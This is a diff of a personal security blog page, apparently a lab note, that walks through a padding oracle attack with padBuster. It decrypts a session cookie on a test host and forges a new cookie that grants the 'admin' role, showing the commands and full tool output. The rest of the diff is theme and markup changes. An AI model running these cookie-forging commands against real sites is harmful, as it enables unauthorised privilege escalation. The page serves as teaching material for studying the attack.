@@ -4,26 +4,47 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
 
     <meta name="author" content="d47zm3">
-    <meta name="description" content="Personal DevOps &amp; Security Site">
+    <meta name="description" content="Performing Padding Oracle Attack using padBuster.
+Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies &#34;secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2&#34; 8 &#43;-------------------------------------------&#43; | PadBuster - v0.3.3 | | Brian Holyfield - Gotham Digital Science | | labs@gdssecurity.com | &#43;-------------------------------------------&#43; INFO: The original request returned the following [&#43;] Status: 200 [&#43;] Location: N/A [&#43;] Content Length: 3854 INFO: Starting PadBuster Decrypt Mode *** Starting Block 1 of 4 *** INFO: No error string was provided.">
     <meta name="keywords" content="blog,devops,personal,security">
 
-    <base href="https://d47zm3.me">
+    
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Padding Oracle Attack"/>
+<meta name="twitter:description" content="Performing Padding Oracle Attack using padBuster.
+Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies &#34;secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2&#34; 8 &#43;-------------------------------------------&#43; | PadBuster - v0.3.3 | | Brian Holyfield - Gotham Digital Science | | labs@gdssecurity.com | &#43;-------------------------------------------&#43; INFO: The original request returned the following [&#43;] Status: 200 [&#43;] Location: N/A [&#43;] Content Length: 3854 INFO: Starting PadBuster Decrypt Mode *** Starting Block 1 of 4 *** INFO: No error string was provided."/>
+
+    <meta property="og:title" content="Padding Oracle Attack" />
+<meta property="og:description" content="Performing Padding Oracle Attack using padBuster.
+Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies &#34;secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2&#34; 8 &#43;-------------------------------------------&#43; | PadBuster - v0.3.3 | | Brian Holyfield - Gotham Digital Science | | labs@gdssecurity.com | &#43;-------------------------------------------&#43; INFO: The original request returned the following [&#43;] Status: 200 [&#43;] Location: N/A [&#43;] Content Length: 3854 INFO: Starting PadBuster Decrypt Mode *** Starting Block 1 of 4 *** INFO: No error string was provided." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d47zm3.me/resources/infosec/padding-oracle-attack/" />
+
+
+
+    
+      <base href="https://d47zm3.me/resources/infosec/padding-oracle-attack/">
+    
     <title>
   Padding Oracle Attack · d47zm3
 </title>
 
-    <link rel="canonical" href="https://d47zm3.me/resources/infosec/padding-oracle-attack/">
+    
+      <link rel="canonical" href="https://d47zm3.me/resources/infosec/padding-oracle-attack/">
+    
 
-    <link href="https://fonts.googleapis.com/css?family=Lato:400,700|Merriweather:300,700|Source+Code+Pro:400,700" rel="stylesheet">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" integrity="sha256-oSrCnRYXvHG31SBifqP2PM1uje7SJUyX0nTwO2RJV54=" crossorigin="anonymous" />
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
 
     
       
       
-      <link rel="stylesheet" href="https://d47zm3.me/css/coder.min.42b57c75b1d9e2f7bcc89c4031716ec188e0a0e63dbde8150859ed6ad58763ec.css" integrity="sha256-QrV8dbHZ4ve8yJxAMXFuwYjgoOY9vegVCFntatWHY&#43;w=" crossorigin="anonymous" media="screen" />
+      <link rel="stylesheet" href="https://d47zm3.me/css/coder.min.3219ef62ae52679b7a9c19043171c3cd9f523628c2a65f3ef247ee18836bc90b.css" integrity="sha256-MhnvYq5SZ5t6nBkEMXHDzZ9SNijCpl8&#43;8kfuGINryQs=" crossorigin="anonymous" media="screen" />
     
 
     
@@ -31,24 +52,29 @@
     
 
     
-      <link rel="stylesheet" href="https://d47zm3.me/css/custom.css">
+      <link rel="stylesheet" href="https://d47zm3.me/css/custom.css" />
+    
+
     
 
     <link rel="icon" type="image/png" href="https://d47zm3.me/img/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://d47zm3.me/img/favicon-16x16.png" sizes="16x16">
 
-    
-
-    <meta name="generator" content="Hugo 0.57.2" />
+    <meta name="generator" content="Hugo 0.65.3" />
   </head>
 
-  <body class=" ">
+  
+  
+  <body class="colorscheme-light"
+        onload=""
+  >
     <main class="wrapper">
       <nav class="navigation">
   <section class="container">
-    <a class="navigation-title" href="https://d47zm3.me">
-      
+    <a class="navigation-title" href="https://d47zm3.me/">
+      d47zm3
     </a>
+    
     <input type="checkbox" id="menu-toggle" />
     <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
     <ul class="navigation-list">
@@ -59,15 +85,7 @@
           </li>
         
           <li class="navigation-item">
-            <a class="navigation-link" href="https://d47zm3.me/projects/">Projects</a>
-          </li>
-        
-          <li class="navigation-item">
             <a class="navigation-link" href="https://d47zm3.me/resources/">Resources</a>
-          </li>
-        
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://d47zm3.me/bookmarks/">Bookmarks</a>
           </li>
         
           <li class="navigation-item">
@@ -77,6 +95,7 @@
       
       
     </ul>
+    
   </section>
 </nav>
 
@@ -89,12 +108,9 @@
       <h1>Padding Oracle Attack</h1>
     </header>
 
-    
-
-<p>Performing Padding Oracle Attack using padBuster.</p>
-
+    <p>Performing Padding Oracle Attack using padBuster.</p>
 <h3 id="stage-1-decrypt-cookie">Stage 1: decrypt cookie</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies &#34;secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2&#34; 8
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies &#34;secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2&#34; 8
 
 +-------------------------------------------+
 | PadBuster - v0.3.3                        |
@@ -142,9 +158,9 @@ Block 4 Results:
 
 [+] Decrypted value (HEX): 7B2275736572223A2261646D696E222C22726F6C65223A2275736572227D0202
 
-[+] Decrypted value (Base64): eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9AgI=</pre></div>
-<h3 id="stage-2-encrypt-new-plaintext-value-and-use-it-as-cookie">Stage 2: encrypt new plaintext value and use it as cookie</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== 8 -cookies &#34;secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2&#34; -plaintext &#39;{&#34;user&#34;:&#34;admin&#34;,&#34;role&#34;:&#34;admin&#34;}&#39;
+[+] Decrypted value (Base64): eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9AgI=
+</code></pre></div><h3 id="stage-2-encrypt-new-plaintext-value-and-use-it-as-cookie">Stage 2: encrypt new plaintext value and use it as cookie</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== 8 -cookies &#34;secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2&#34; -plaintext &#39;{&#34;user&#34;:&#34;admin&#34;,&#34;role&#34;:&#34;admin&#34;}&#39;
 
 +-------------------------------------------+
 | PadBuster - v0.3.3                        |
@@ -206,26 +222,51 @@ Block 1 Results:
 ** Finished ***
 
 [+] Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D
--------------------------------------------------------</pre></div>
+-------------------------------------------------------
+</code></pre></div>
   </article>
 </section>
 
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ['$', '$'], ['\\(', '\\)']
+        ],
+        processEscapes: true,
+        processEnvironments: true
+      },
+      options: {
+        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      }
+    };
+  </script>
 
       </div>
 
-      <footer class="footer">
-  <section class="container">
-    
-     © 2019
-    
-       · 
-      Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
-    
-    
-  </section>
-</footer>
+      
+  <footer class="footer">
+    <section class="container">
+      
+      
+        ©
+        
+        2020
+         d47zm3 
+      
+      
+      
+    </section>
+  </footer>
 
     </main>
+
+    
+
+    
 
     
 
